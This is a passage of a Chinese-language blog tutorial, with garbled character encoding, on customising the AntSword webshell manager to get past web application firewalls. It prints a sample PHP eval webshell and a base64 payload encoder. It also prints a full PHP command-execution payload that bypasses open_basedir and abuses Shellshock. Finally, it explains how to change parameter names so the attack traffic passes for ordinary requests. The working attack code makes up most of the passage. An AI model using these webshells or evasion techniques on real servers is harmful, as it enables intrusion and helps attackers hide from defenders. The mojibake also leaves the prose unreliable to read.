class="headerlink" title="2.phpä¸‹çš„æ–‡ä»¶å¤§è‡´ä»‹ç»"></a>2.phpä¸‹çš„æ–‡ä»¶å¤§è‡´ä»‹ç»</h5><h6 id="2-1phpä¸‹çš„æ–‡ä»¶å¤§è‡´ä»‹ç»"><a href="#2-1phpä¸‹çš„æ–‡ä»¶å¤§è‡´ä»‹ç»" class="headerlink" title="2.1phpä¸‹çš„æ–‡ä»¶å¤§è‡´ä»‹ç»"></a>2.1phpä¸‹çš„æ–‡ä»¶å¤§è‡´ä»‹ç»</h6><p>phpæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸‰ä¸ªæ–‡ä»¶å¤¹ï¼Œå…¶ä¸­templateä¸‹é¢æ˜¯æ•°æ®åº“æ“ä½œçš„ä»£ç ï¼Œæœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸ª</p><p><img src="/images/antsword-bypasswaf/image-20240301091749865.png" alt="image-20240301091749865"></p><p>è¿™é‡Œä¸º<em>æ•°æ®åº“ç®¡ç†æ¨¡æ¿::mssql</em>çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æœ¬è´¨æ ¸å¿ƒä½¿ç”¨phpè¯­è¨€å†™çš„ï¼Œ<br>$T=@mssql_connect($hst,$usr,$pwd);ç”¨äºè¿æ¥æ•°æ®åº“<br>$q=@mssql_query(â€œselect [name] from master.dbo.sysdatabases order by 1â€,$T);æŸ¥åº“</p><p><img src="/images/antsword-bypasswaf/image-20240301092036379.png" alt="image-20240301092036379"></p><p><em>æ•°æ®åº“ç®¡ç†æ¨¡æ¿::mysql</em> ä¸€æ ·çš„æ“ä½œï¼Œä¸è¿‡ä¸åŒçš„æ•°æ®åº“è¯­æ³•ä¸åŒã€‚å…¶ä»–çš„ä¸åœ¨ä¸€ä¸€åˆ—ä¸¾</p><p><img src="/images/antsword-bypasswaf/image-20240301092219954.png" alt="image-20240301092219954"></p><h6 id="2-2decoderå’Œencoder"><a href="#2-2decoderå’Œencoder" class="headerlink" title="2.2decoderå’Œencoder"></a>2.2decoderå’Œencoder</h6><p><img src="/images/antsword-bypasswaf/image-20240301093308427.png" alt="image-20240301093308427"></p><p>åœ¨å½“å‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œéƒ½æ˜¯èšå‰‘é»˜è®¤è‡ªå¸¦çš„ç¼–ç å™¨å’Œè§£ç å™¨ï¼Œå¦‚æœæƒ³æ‰¾æˆ‘ä»¬è‡ªå·±æ–°å»ºçš„ï¼Œåº”è¯¥å»<code>antData-&gt;php-&gt;decoderæˆ–è€…encoder</code></p><p><img src="/images/antsword-bypasswaf/image-20240301093612786.png"></p><p>ä¸åŒçš„è¯­è¨€å¯¹åº”ä¸åŒçš„ç¼–ç è§£ç å™¨æ–‡ä»¶ï¼Œæ¨¡å—åŒ–ã€‚</p><h5 id="3-ç¼–ç å™¨ä¸è§£ç å™¨"><a href="#3-ç¼–ç å™¨ä¸è§£ç å™¨" class="headerlink" title="3.ç¼–ç å™¨ä¸è§£ç å™¨"></a>3.ç¼–ç å™¨ä¸è§£ç å™¨</h5><h6 id="3-1ç¼–ç å™¨å·¥ä½œæµç¨‹"><a href="#3-1ç¼–ç å™¨å·¥ä½œæµç¨‹" class="headerlink" title="3.1ç¼–ç å™¨å·¥ä½œæµç¨‹"></a>3.1ç¼–ç å™¨å·¥ä½œæµç¨‹</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/01 09:42:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line">  <span class="comment">// ä»¥ä¸‹ä»£ç ä¸º PHP Base64 æ ·ä¾‹</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç”Ÿæˆä¸€ä¸ªéšæœºå˜é‡å</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// åŸæœ‰çš„ payload åœ¨ data[&#x27;_&#x27;]ä¸­</span></span><br><span class="line">  <span class="comment">// å–å‡ºæ¥ä¹‹åï¼Œè½¬ä¸º base64 ç¼–ç å¹¶æ”¾å…¥ randomID key ä¸‹</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ é™¤ _ åŸæœ‰çš„payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»é¦–å…ˆæ¥çœ‹ä¸€ä¸‹èšå‰‘è‡ªå¸¦çš„base64ç¼–ç å™¨ï¼Œç®€å•è§£é‡Šä¸€ä¸‹ï¼Œèšå‰‘åœ¨å‘é€æ•°æ®åŒ…æ—¶ï¼Œä¼šå‘é€é”®å€¼å¯¹çš„æ•°ç»„ï¼Œå…¶ä¸­pwdä¸ºwebshellçš„å¯†ç ï¼Œè€Œdataæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œextä¸ºæ‰©å±•ï¼Œè¿™é‡Œå¯èƒ½æ¯”è¾ƒæŠ½è±¡ï¼Œ<br>å‡å¦‚æˆ‘ä»¬çš„webshellä¸º<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>é‚£ä¹ˆå®ƒçš„å¯†ç å°±ä¸ºaï¼Œä¸Šé¢çš„pwdå°±ä¸ºa<br><img src="/images/antsword-bypasswaf/image-20240301094919153.png" alt="image-20240301094919153"></p><p>è¿™é‡Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºa,é‚£ä¹ˆaçš„å€¼ç”±è°å†³å®šå‘¢ï¼Œaçš„å€¼åœ¨core-&gt;phpä¸‹çš„index.jså†³å®šï¼Œåˆšåˆšä¸Šé¢å·²ç»çœ‹åˆ°äº†<br><img src="/images/antsword-bypasswaf/image-20240301095341111.png" alt="image-20240301095341111"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="variable">$opdir</span>=@ini_get(<span class="string">&quot;open_basedir&quot;</span>);<span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;<span class="variable">$ocwd</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$oparr</span>=preg_split(base64_decode(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);@array_push(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,sys_get_temp_dir());<span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;<span class="keyword">if</span>(!@is_writable(<span class="variable">$item</span>))&#123;<span class="keyword">continue</span>;&#125;;<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.8aa9fc8b20&quot;</span>;@mkdir(<span class="variable">$tmdir</span>);<span class="keyword">if</span>(!@file_exists(<span class="variable">$tmdir</span>))&#123;<span class="keyword">continue</span>;&#125;<span class="variable">$tmdir</span>=realpath(<span class="variable">$tmdir</span>);@chdir(<span class="variable">$tmdir</span>);@ini_set(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);<span class="variable">$cntarr</span>=@preg_split(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;sizeof(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;@chdir(<span class="string">&quot;..&quot;</span>);&#125;;@ini_set(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);@rmdir(<span class="variable">$tmdir</span>);<span class="keyword">break</span>;&#125;;&#125;;;<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>.<span class="string">&quot;&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>.<span class="string">&quot;&quot;</span>;&#125;ob_start();<span class="keyword">try</span>&#123;<span class="variable">$p</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;detail&quot;</span>],<span class="number">2</span>));<span class="variable">$s</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;value&quot;</span>],<span class="number">2</span>));<span class="variable">$envstr</span>=@base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>],<span class="number">2</span>));<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">False</span>;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@unlink(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">print</span>(<span class="variable">$output</span>);<span class="keyword">return</span> <span class="literal">True</span>;&#125;&#125;<span class="keyword">return</span> <span class="literal">False</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;<span class="variable">$ret</span>=<span class="number">0</span>;<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@exec(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="keyword">print</span>(join(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));&#125;@pclose(<span class="variable">$fp</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));&#125;@fclose(<span class="variable">$io</span>[<span class="number">1</span>]);@fclose(<span class="variable">$io</span>[<span class="number">2</span>]);@proc_close(<span class="variable">$p</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="keyword">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = <span class="number">127</span>;&#125;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;<span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>å…¶ä¸­è¿™é‡Œæ˜¯ä¼ é€’çš„åŠŸèƒ½ï¼Œæ¯”å¦‚è¿™é‡Œ$p=base64_decode(substr($_POST[â€œdetailâ€],2));$s=base64_decode(substr($_POST[â€œvalueâ€],2));$envstr=@base64_decode(substr($_POST[â€œactionâ€],2))ï¼Œä¼ é€’äº†å‚æ•°ï¼Œè¿™ä¸ªæ˜¯index.jså¼•ç”¨çš„tmpcode<br><img src="/images/antsword-bypasswaf/image-20240301100445659.png" alt="image-20240301100445659"></p><p>é‚£ä¹ˆtmpcodeæ˜¯ä¼ é€’çš„å‚æ•°ï¼Œä»–ä¸æ˜¯å›ºå®šçš„ï¼Œå¦‚æœåœ¨æ‰§è¡Œcmdå‘½ä»¤æ—¶ï¼Œå°±ä¼šåˆ°å½“å‰çš„command.jsé‡Œ<br>ä¼ é€’å‚æ•°</p><p><img src="/images/antsword-bypasswaf/image-20240301101303575.png" alt="image-20240301101303575">å¦‚æœæ‰§è¡Œå…¶ä»–çš„åŠŸèƒ½ï¼Œæ¯”å¦‚å¢åˆ æ”¹æŸ¥æ–‡ä»¶ï¼Œå°±ä¼šåˆ°filemangagerï¼Œä¼ é€’é‚£å‡ ä¸ªargå‚æ•°ã€‚</p><p>èšå‰‘é»˜è®¤æŠŠä¼ é€’çš„å‚æ•°ä»2å¼€å§‹å–,ä¹Ÿå³æ˜¯è§£ç çš„æ—¶å€™åˆ å»ä¸¤ä¸ªå­—ç¬¦</p><p>detail=K5L2Jpbi9zaA%3D%3D&amp;value=fMY2QgIi93d3cvd3d3cm9vdC9hIjtscztlY2hvIGFmNjMzNjg4N2M3O3B3ZDtlY2hvIGU2MzA0ZDk%3D<br><img src="/images/antsword-bypasswaf/image-20240301101635444.png" alt="image-20240301101635444"></p><p>æœ€ä¸‹é¢valueçš„å€¼ä¸ºæˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><h6 id="3-2å‚æ•°ä¿®æ”¹"><a href="#3-2å‚æ•°ä¿®æ”¹" class="headerlink" title="3.2å‚æ•°ä¿®æ”¹"></a>3.2å‚æ•°ä¿®æ”¹</h6><p>åœ¨æ²¡æœ‰è‡ªå®šä¹‰ç¼–ç å™¨ä¹‹å‰ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹èšå‰‘é»˜è®¤ä¼ é€’æ‰§è¡ŒæŸäº›åŠŸèƒ½æ—¶ä¼ é€’çš„å‚æ•°ï¼Œåœ¨core-&gt;base.jsä¸­å®šä¹‰äº†argçš„å†™æ³•ï¼Œ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">argv</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// ç”Ÿæˆä¸€ä¸ªéšæœºçš„å˜é‡å</span></span><br><span class="line">    <span class="keyword">let</span> random;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.__opts__.otherConf[<span class="string">&quot;use-random-variable&quot;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// éšæœºè¿”å›å•è¯, æ’é™¤ body å’Œ pwd</span></span><br><span class="line">      <span class="keyword">let</span> excludes = <span class="built_in">Object</span>.keys(<span class="built_in">this</span>.__opts__.httpConf.body).concat(<span class="built_in">this</span>.__opts__.pwd);</span><br><span class="line">      <span class="keyword">return</span> antSword[<span class="string">&#x27;utils&#x27;</span>].RandomChoice(antSword[<span class="string">&#x27;RANDOMWORDS&#x27;</span>], excludes, <span class="number">6</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      random = <span class="function">() =&gt;</span> <span class="string">`<span class="subst">$&#123;antSword[<span class="string">&#x27;utils&#x27;</span>].RandomLowercase()&#125;</span><span class="subst">$&#123;(<span class="built_in">Math</span>.random() + <span class="built_in">Math</span>.random()).toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>; <span class="comment">// è¿”å›å…­ä¸ªéšæœºå˜é‡åæ•°ç»„</span></span><br><span class="line">      <span class="keyword">return</span> [</span><br><span class="line">        random(),</span><br><span class="line">        random(),</span><br><span class="line">        random(),</span><br><span class="line">        random(),</span><br><span class="line">        random(),</span><br><span class="line">        random()</span><br><span class="line">      ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å®šä¹‰çš„argvå‡½æ•°ï¼Œrandomä¸º<code>Math.random() + Math.random()).toString(16).substr(2)&#125;</code>ä¹Ÿå°±æ˜¯éšæœº10ä¸ªå­—ç¬¦ä¼ é€’å‚æ•°çš„æ—¶å€™å°±æ˜¯è¿™æ ·çš„<br><img src="/images/antsword-bypasswaf/image-20240301110342753.png" alt="image-20240301110342753"></p><p>è¿™ç§æˆ–è®¸å·²ç»è¢«æŸäº›å‚å•†æ ‡è®°äº†ï¼Œæˆ–è®¸å§ï¼Œä¸å¤ªæ¸…æ¥šï¼Œç¨å¾®æ”¹ä¸€ä¸‹ã€‚è¿™é‡Œæˆ‘ä»¬ä¼ªè£…æˆæ­£å¸¸é‚£ç§æµé‡ï¼Œæ¯”å¦‚ä¼ é€’å‚æ•°çš„æ—¶å€™é”®çš„è®¾ç½®ï¼Œ<br><img src="/images/antsword-bypasswaf/image-20240301113444397.png" alt="image-20240301113444397"></p><p>éšä¾¿æ‰¾äº†ä¸€ä¸ªå¾®ä¿¡çš„ä»–çš„è¿™ç§åç§°æ˜¯é‚£ç§å¸¸ç”¨çš„ï¼Œnameï¼Œkeyï¼Œview ä¼¼ä¹æ­£å¸¸ä¸€ç‚¹   ï¼Œç¬”è€…åœ¨è¿™é‡Œæ‰¾äº†å‡ ä¸ªå¸¸ç”¨çš„å…³é”®å­—ï¼Œ </p><p><img src="/images/antsword-bypasswaf/image-20240301134047863.png" alt="image-20240301134047863"></p><p>ç›´æ¥ç»™ä»–æ›¿æ¢æ‰ï¼ŒæŠŠrandomï¼Œæ³¨é‡Šäº†å³å¯ã€‚è¿™é‡Œæ”¹å®Œé…ç½®æ–‡ä»¶è¦é‡å¯ä¸€ä¸‹èšå‰‘</p><p><img src="/images/antsword-bypasswaf/image-20240301134310508.png" alt="image-20240301134310508"></p><p>è¿™ä¸ªæ—¶å€™å°±æŠŠé”®ç»™æ”¹äº†ï¼Œç›´æ¥ç»™å®šæ­»äº†ï¼Œå°±æ˜¯é‚£å‡ ä¸ªå€¼ã€‚<br><img src="/images/antsword-bypasswaf/image-20240301134351168.png" alt="image-20240301134351168"></p><p>è¿™é‡Œç¬¬ä¸€ä¸ªä¼ å‚æ˜¯webshellçš„å¯†ç ï¼Œå»ºè®®å¯†ç è®¾ç½®çš„æ—¶å€™ç»™ä»–è®¾ç½®æˆå¸¸è§çš„å•è¯ï¼Œæ›´å®Œç¾ä¸€äº›ã€‚</p><h6 id="3-2è‡ªå®šä¹‰ç¼–ç å™¨"><a href="#3-2è‡ªå®šä¹‰ç¼–ç å™¨" class="headerlink" title="3.2è‡ªå®šä¹‰ç¼–ç å™¨"></a>3.2è‡ªå®šä¹‰ç¼–ç å™¨</h6><p>å®˜æ–¹ç»™å‡ºçš„base64ç¼–ç å™¨ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/01 09:42:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ 